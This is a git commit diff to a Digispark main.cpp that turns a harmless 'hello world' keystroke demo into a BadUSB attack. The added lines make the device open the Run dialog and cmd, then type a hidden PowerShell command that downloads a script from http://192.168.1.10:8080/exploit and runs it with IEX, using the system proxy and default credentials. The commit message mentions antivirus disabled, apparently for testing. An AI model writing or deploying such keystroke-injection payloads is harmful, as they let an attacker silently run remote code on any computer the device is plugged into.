8f86a7eabd735a0a1bc20058d352b2072525e0a1
Xre0uS <hello@xre0us.io>
2025-03-23 17:15:19 +0800

    Digispark web delivery (antivirus disabled)

--- main.cpp
+++ main.cpp
@@ -4,13 +4,12 @@ void setup() {
   // don't need to set anything up to use DigiKeyboard
   DigiKeyboard.sendKeyStroke(0);
 
-  DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(60);
+  DigiKeyboard.println("cmd");
   DigiKeyboard.delay(600);
-  DigiKeyboard.println("notepad");
-  DigiKeyboard.delay(600);
-  DigiKeyboard.println("hello world");
-}
+  DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
+  }
 
 
 void loop() {
